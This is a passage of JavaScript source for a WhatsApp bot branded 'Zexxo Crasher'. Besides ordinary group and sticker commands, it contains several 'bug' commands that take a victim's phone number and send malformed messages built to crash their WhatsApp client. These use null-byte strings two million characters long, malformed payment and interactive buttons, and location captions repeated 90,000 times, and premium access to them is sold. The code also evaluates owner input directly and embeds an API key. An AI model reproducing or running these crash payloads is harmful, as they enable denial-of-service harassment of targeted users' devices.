await deltacrashgcinc.sendMessage(from, {text: fuckdellod[i], edit: key });
}
}

        if (!deltacrashgcinc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            deltacrashgcinc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        deltacrashgcinc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        deltacrashgcinc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        deltacrashgcinc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let fuckdelrecordin = ['recording','composing']
        let fuckdelrecordinfinal = fuckdelrecordin[Math.floor(Math.random() * fuckdelrecordin.length)]
        deltacrashgcinc.sendPresenceUpdate(fuckdelrecordinfinal, from)

        }
        
        if (autobio) {
            deltacrashgcinc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return deltacrashgcinc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await deltacrashgcinc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await deltacrashgcinc.getName(i)}\nFN:${await deltacrashgcinc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            
			console.log(chalk.green(`GRUP CHAT:`))
            console.log(chalk.black(chalk.bgWhite('')), chalk.black(chalk.bgRed(new Date)), chalk.black(chalk.bgRed(budy || m.mtype)) + '\n' + chalk.magenta('dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            
			console.log(chalk.green(`PRIBADI:`))
            console.log(chalk.black(chalk.bgRed('')), chalk.black(chalk.bgRed(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('dari'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
               
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    deltacrashrevolutionReply(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                deltacrashgcinc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isCreator) return deltacrashrevolutionReply(mess.owner)
                if (args.length < 2)
                    return deltacrashrevolutionReply(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    deltacrashrevolutionReply("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    deltacrashrevolutionReply("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return deltacrashrevolutionReply(mess.owner)
                if (args.length < 1) return deltacrashrevolutionReply(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    deltacrashrevolutionReply("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    deltacrashrevolutionReply("Success")
                }
                break
            case 'autoread':
                if (!isCreator) return deltacrashrevolutionReply(mess.owner)
                if (args.length < 1) return deltacrashrevolutionReply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    deltacrashrevolutionReply(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    deltacrashrevolutionReply(`Successfully changed autoread to ${q}`)
                }
                break
            case 'kick':
                if (!m.isGroup) return deltacrashrevolutionReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return deltacrashrevolutionReply(mess.admin)
                if (!isBotAdmins) return deltacrashrevolutionReply(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await deltacrashgcinc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => deltacrashrevolutionReply(json(res))).catch((err) => deltacrashrevolutionReply(json(err)))
                break
            case 'add':
                if (!m.isGroup) return deltacrashrevolutionReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return deltacrashrevolutionReply(mess.admin)
                if (!isBotAdmins) return deltacrashrevolutionReply(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await deltacrashgcinc.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => deltacrashrevolutionReply(json(res))).catch((err) => deltacrashrevolutionReply(json(err)))
                break
            case 'hidetag':
                if (!m.isGroup) return deltacrashrevolutionReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return deltacrashrevolutionReply(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return deltacrashrevolutionReply(mess.botAdmin)
                deltacrashgcinc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'pay':
            case 'payment':
                let textnate = `hai ${pushname} berikut adalah methode pembayaran di delta tech\n\n ᝰ.ᐟ Dana/Gopay: 083187035090\nᝰ.ᐟ Ovo: 085381775839\nᝰ.ᐟ Qris Semua pembayaran: https://i.top4top.io/p_3173v28h34.jpg`
                deltacrashgcinc.sendMessage(m.chat, {
                    text: 'ᝰ.ᐟ Paypal Internasional: https://www.paypal.me/DeltaCrash881\n' + textnate
                }, {
                    quoted: m
                })
                break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return deltacrashrevolutionReply(`*[warning]* Reply atau kirim gambar dengan caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await deltacrashgcinc.sendImageAsSticker(m.chat, media, m, {
                        packname: 'Zexxo nihh🗿🚬',
                        author: '𝖅𝖊𝖃𝖝𝖔 𝕮𝖗𝖆𝖘𝖍𝖊𝖗'
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return deltacrashrevolutionReply('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await deltacrashgcinc.sendVideoAsSticker(m.chat, media, m, {
                        packname: 'dibuat oleh bot',
                        author: 'Jexxo'
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return deltacrashrevolutionReply(`*[kesalahan]* kirim gambar dengan caption ${prefix + command}\nminimal durasi 1/9 detik`)
                }
            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return deltacrashrevolutionReply(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return deltacrashrevolutionReply(`Example : ${prefix + command} 😅+🤔`)
                deltacrashrevolutionReply(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await deltacrashgcinc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: 'dibuat oleh Zexxo',
                        author: '𝖅𝖊𝖃𝖝𝖔 𝕮𝖗𝖆𝖘𝖍𝖊𝖗',
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'addowner':
                if (!isCreator) return deltacrashrevolutionReply(mess.owner)
if (!args[0]) return deltacrashrevolutionReply(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await deltacrashgcinc.onWhatsApp(bnnd)
if (ceknye.length == 0) return deltacrashrevolutionReply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
deltacrashrevolutionReply(`*ᴏᴋᴇ* ɴᴏᴍᴏʀ ${bnnd} sᴜᴅᴀʜ ᴍᴇɴᴊᴀᴅɪ ᴏᴡɴᴇʀ`)
break
case 'delowner':
                if (!isCreator) return deltacrashrevolutionReply(mess.owner)
if (!args[0]) return deltacrashrevolutionReply(`Use ${prefix+command} nomor\nExample ${prefix+command} 6283123456789`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
deltacrashrevolutionReply(`*ᴡᴀᴅᴜʜ* ɴᴏᴍᴏʀ  ${ya} ʙᴜᴋᴀɴ ᴏᴡɴᴇʀ ʟᴀɢɪ`)
break
//bug cases
case 'zxone': case 'eagle-crash': case 'virtex': case 'zexxocrash': case '1hit': case 'crashui': case 'onehit': case 'crash-total': case '🐣': case '🌹': case '🦅': case '🌷': {
	if (!isCreator) return deltacrashrevolutionReply(mess.owner)
if (!text) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ cara penggunaan: .${command} 6283123456789`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ contoh: ${prefix+command} 6283123456789`)
var contactInfo = await deltacrashgcinc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285381775839") {
    return;
    }
    if (cleanedNumber == "6285381775839") {
    return;
    }
    if (cleanedNumber == "6285381775839") {
    return;
  }
  if (contactInfo.length == 0) {
    return deltacrashrevolutionReply("The number is not registered on WhatsApp");
  }
  async function fuckdelIosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await deltacrashgcinc.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '🛡𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴꙰',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description:  '𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗𝐎꙰',
								title: '𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴꙰',
								textArgb: 0xff000000,
								backgroundArgb: 0xffffffff,
								font: 1,
								previewType: 0,
								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
								contextInfo: {
								},
								doNotPlayInline: false,
								thumbnailDirectPath: 'https://example.com/thumb.jpg',
								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
								mediaKey: Buffer.from(
									'abcdef1234567890abcdef1234567890',
									'hex'
								),
								mediaKeyTimestamp: Date.now(),
								thumbnailHeight: 200,
								thumbnailWidth: 200,
								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
								inviteLinkParentGroupThumbnailV2: Buffer.from(
									'abcdef1234567890',
									'hex'
								),
								inviteLinkGroupTypeV2: 0,
								viewOnce: true,
							},
						},
						{ participant: { jid: jid } }
					);
				}
	for (let i = `3`; i !== 0; i -= 1) {
       await deltacrashgcinc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🛡𝖒𝖆𝖒𝖕𝖚𝖘 𝖐𝖊𝖓𝖆 𝖚𝖎 𝖘𝖞𝖘𝖙𝖊𝖒😹","key":"+6285381775839","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				for (let i = `3`; i !== 0; i -= 1) {
					await deltacrashgcinc.relayMessage(
						jid,
						{
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										header: {
											title: '',
											subtitle: ' ',
										},
										body: {
											text: '𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴',
										},
										footer: {
											text: 'xp',
										},
										nativeFlowMessage: {
											buttons: [
												{
													name: 'cta_url',
													buttonParamsJson:
														"{ display_text : '𝖒𝖆𝖒𝖕𝖚𝖘 𝖐𝖊𝖓𝖆 𝖚𝖎 𝖘𝖞𝖘𝖙𝖊𝖒😹', url : '', merchant_url : '' }",
												},
											],
											messageParamsJson: '\0'.repeat(2000000),
										},
									},
								},
							},
						},
						{ participant: { jid: jid } }
					);
					}
				}
await deltacrashrevolutionReply(`SUCSES!!! cek nomer target,jika masih c2 mengalami delay maker`)
            await fuckdelIosShot(whatsappNumber);
            deltacrashrevolutionReply(
    "Status: *Successfully*\nTarget: @" + whatsappNumber.split('@')[0] + 
    "\nNamaVirus: *" + command + "*", 
    [whatsappNumber]
  );
            }
            
				break;
				case 'zxone': case 'eagle-crash': case 'virtex': case 'zexxocrash': case '1hit': case 'crashui': case 'onehit': case 'crash-total': case '🐣': case '🌹': case '🦅': case '🌷': {
					if (!isPremium) return deltacrashrevolutionReply(mess.prem)
if (!text) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ cara penggunaan: .${command} 6283123456789`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ contoh: ${prefix+command} 6283123456789`)
var contactInfo = await deltacrashgcinc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285381775839") {
    return;
    }
    if (cleanedNumber == "6285381775839") {
    return;
    }
    if (cleanedNumber == "6285381775839") {
    return;
  }
  if (contactInfo.length == 0) {
    return deltacrashrevolutionReply("The number is not registered on WhatsApp");
  }
  async function fuckdelBugPay(jid){
				await deltacrashgcinc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+6285381775839","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await fuckdelBugPay(whatsappNumber);
            deltacrashrevolutionReply(
    "Status: *Successfully*\nTarget: @" + whatsappNumber.split('@')[0] + 
    "\nNamaVirus: *" + command + "*", 
    [whatsappNumber]
  );
				}
				break;
		case 'zxone': case 'eagle-crash': case 'virtex': case 'zexxocrash': case '1hit': case 'crashui': case 'onehit': case 'crash-total': case '🐣': case '🌹': case '🦅': case '🌷': {
if (!isPremium) return deltacrashrevolutionReply(mess.prem)
if (!q) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ cara penggunaan: .${command} 6283123456789`)
let fuckdelyvictim = q.replace(/[^0-9]/g, "")
if (fuckdelyvictim.startsWith('0')) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ contoh: .${command} 6283123456789`)
let target = fuckdelyvictim + '@s.whatsapp.net'
await deltacrashrevolutionReply(`In process....`)
for (let j = 0; j < 1; j++) {
await listfuckdelfck(target, oneclickfuckdel)
await locationfuckdely(target, force)
await fuckdelkillpic(target, oneclickfuckdel)
await locationfuckdely(target, force)
await blackening(target, force2)
await locationfuckdely(target, force)
}
await deltacrashrevolutionReply(`Successfully Send Bug to ${fuckdelyvictim} Using ${command}.`)
}
break

case 'rvo': {
	if (!m.quoted) return deltacrashrevolutionReply(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return deltacrashrevolutionReply(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return deltacrashgcinc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return deltacrashgcinc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'zxone': case 'eagle-crash': case 'virtex': case 'zexxocrash': case '1hit': case 'crashui': case 'onehit': case 'crash-total': case '🐣': case '🌹': case '🦅': case '🌷' : {
//	if (!isCreator) return deltacrashrevolutionReply(mess.owner)
if (!text) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ cara penggunaan: .${command} 6283123456789`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return deltacrashrevolutionReply(`[ \`KESALAHAN\` ]
ᝰ.ᐟ contoh: ${prefix+command} 6283123456789`)
var contactInfo = await deltacrashgcinc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285381775839") {
    return;
    }
    if (cleanedNumber == "6285381775839") {
    return;
    }
    if (cleanedNumber == "6285381775839") {
    return;
  }
  if (contactInfo.length == 0) {
    return deltacrashrevolutionReply("The number is not registered on WhatsApp");
  }
  async function fuckdelIosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await deltacrashgcinc.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '🛡𝐈𝐊𝐈 𝐙𝐞𝐗𝐱𝐨 𝐋𝐎𝐇 𝐂𝐀𝐗💥🔥֒',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: '𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴',
								title: '🛡𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴',
								textArgb: 0xff000000,
								backgroundArgb: 0xffffffff,
								font: 1,
								previewType: 0,
								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
								contextInfo: {
								},
								doNotPlayInline: false,
								thumbnailDirectPath: 'https://example.com/thumb.jpg',
								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
								mediaKey: Buffer.from(
									'abcdef1234567890abcdef1234567890',
									'hex'
								),
								mediaKeyTimestamp: Date.now(),
								thumbnailHeight: 200,
								thumbnailWidth: 200,
								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
								inviteLinkParentGroupThumbnailV2: Buffer.from(
									'abcdef1234567890',
									'hex'
								),
								inviteLinkGroupTypeV2: 0,
								viewOnce: true,
							},
						},
						{ participant: { jid: jid } }
					);
				}
	for (let i = `3`; i !== 0; i -= 1) {
       await deltacrashgcinc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🛡𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗𝐎","key":"+6285381775839","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				for (let i = `3`; i !== 0; i -= 1) {
					await deltacrashgcinc.relayMessage(
						jid,
						{
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										header: {
											title: '',
											subtitle: ' ',
										},
										body: {
											text: '𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴',
										},
										footer: {
											text: 'xp',
										},
										nativeFlowMessage: {
											buttons: [
												{
													name: 'cta_url',
													buttonParamsJson:
														"{ display_text : '𝖒𝖆𝖒𝖕𝖚𝖘 𝖐𝖊𝖓𝖆 𝖚𝖎 𝖘𝖞𝖘𝖙𝖊𝖒😹', url : '', merchant_url : '' }",
												},
											],
											messageParamsJson: '\0'.repeat(2000000),
										},
									},
								},
							},
						},
						{ participant: { jid: jid } }
					);
					}
				}
await deltacrashrevolutionReply(`*[sᴜᴄᴄᴇsғᴜʟʟʏ]* ʙᴜɢ ʙᴇʀʜᴀsɪʟ ᴅɪᴋɪʀɪᴍ 🐞`)
            await fuckdelIosShot(whatsappNumber);
            deltacrashrevolutionReply(
    "Status: *Successfully*\nTarget: @" + whatsappNumber.split('@')[0] + 
    "\nNamaVirus: *" + command + "*", 
    [whatsappNumber]
  );
            }
            
				break;
            case 'menu': case 'zexxov6':
                let manhwa = `┌────────────────┈ ⳹
│「 Welcome @${pushname} 👋 」
└┬❖ 「  ${fuckdelytimewisher}   」
   │𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴
   └───────────────┈ ⳹
${readmore}
┌───────────────┈ ⳹
│「 \`bug internal & external\` 」
│ _eagle-crash <628xxx>_
│ᬊ _virtex <628xxx>_
│ᬊ _zexxocrash <628xxx> (BAHAYA!!!)_
│ᬊ _1hit <628xxx>_
│ᬊ _crashui <628xxx>_
│ᬊ _onehit <628xxx>_
│ᬊ _crash-total <628xxx>_
│ᬊ _zxone <628xxx>_
└───────────────┈ ⳹
┌───────────────┈ ⳹
│「 \`bug emoji 𝖅𝖊𝖃𝖝𝖔 𝕮𝖗𝖆𝖘𝖍𝖊𝖗\` 」
│ᬊ _🦅 <628xxx>_
│ᬊ _🌹 <628xxx>_
│ᬊ _🌷 <628xxx>_
│ᬊ _🐣 <628xxx>_
└───────────────┈ ⳹
┌───────────────┈ ⳹
│「 \`bug and emoji in place\` 」
│ᬊ _inject-place_
│ᬊ _inject-placev2_
│ᬊ _fuck_
│ᬊ _tes?_
│ᬊ _😹_
│ᬊ _🚮_
│ᬊ _🐀_
└───────────────┈ ⳹
┌───────────────┈ ⳹
│ᬊ  「 \`sticker & create\` 」
│ᬊ _emojimix_
│ᬊ _sticker_
│ᬊ _yalilyalili_
└───────────────┈ ⳹
┌───────────────┈ ⳹
│「 \`control & main\` 」
│ᬊ _addowner <628xxx>_
│ᬊ _delowner <628xxx>_
│ᬊ _addprem <628xxx>_
│ᬊ _delprem <628xxx>_
│ᬊ _payment_
│ᬊ _hidetag_
│ᬊ _tagall_
│ᬊ _autoread_
│ᬊ _kick <@tag>_
│ᬊ _add <628xxx>_
│ᬊ _rvo_
└───────────────┈ ⳹`
if (typemenu === 'v1') {
                    deltacrashgcinc.sendMessage(m.chat, {
                        text: manhwa,
                        contextInfo: {
                            externalAdReply: {
                                title: '©𝖅𝖊𝖃𝖝𝖔 𝕮𝖗𝖆𝖘𝖍𝖊𝖗 > UndercrashBug V7🚬',
                                body: 'OFFICIAL SC BY 𝖅𝖊𝖃𝖝𝖔 𝕮𝖗𝖆𝖘𝖍𝖊𝖗',
                                thumbnailUrl: 'https://i.top4top.io/p_3268nuhjg0.jpg',
                                //sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    }
                break
                case "public": {
if (!isCreator) return fsaluran(mess.owner)
deltacrashgcinc.public = true
deltacrashrevolutionReply("*[sᴜᴄᴄᴇssғᴜʟʟʏ]* ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢᴜʙᴀʜ ᴋᴇ ᴍᴏᴅᴇ ᴘᴜʙʟɪᴄ")
}
break
case "self": {
if (!isCreator) return deltacrashrevolutionReply(mess.owner)
deltacrashgcinc.public = false
deltacrashrevolutionReply("*[sᴜᴄᴄᴇssғᴜʟʟʏ]* ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢᴜʙᴀʜ ᴋᴇ ᴍᴏᴅᴇ sᴇʟғ/ᴘʀɪʙᴀᴅɪ")
}
break
case 'yalilyalili': {
darkphonk = fs.readFileSync('./menu.mp3')
    deltacrashgcinc.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "🐀": case "🚮": case "😹": case "fuck": case "inject-place": case "inject-placev2": case "tes?":{
if (!isCreator) return deltacrashrevolutionReply(mess.owner)
let jumlah = "99"
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `࿆͆᷍𝖒𝖆𝖒𝖕𝖚𝖘 𝖐𝖊𝖓𝖆 𝖚𝖎 𝖘𝖞𝖘𝖙𝖊𝖒😹`+"𝐏⃭⃭⃑⃑⃰⃰⃰⃕⃔𝐧⃭⃭⃭⃑⃑𝐙⃭⃭⃭⃑⃑⃰⃰⃐⃑⃕ꦾꦀꦀꦀꦀꦀꦀꦁꦁꦀꦀꦁꦁꦀꦁꦁꦀꦀꦁꦀꦀꦁꦀꦀꦁꦀꦀꦁꦀꦀꦁꦀꦀꦁꦁꦀꦀꦀ".repeat(90000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: aikamemek })
await deltacrashgcinc.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
}
    deltacrashrevolutionReply("\`LANJUT KAN BAKAT MU!!!\`\nsᴛᴀᴛᴜs: *sᴜᴄᴄᴇssғᴜʟʟʏ*")
}
        break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return deltacrashrevolutionReply(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return deltacrashrevolutionReply(bang)
                    }
                    try {
                        deltacrashrevolutionReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        deltacrashrevolutionReply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
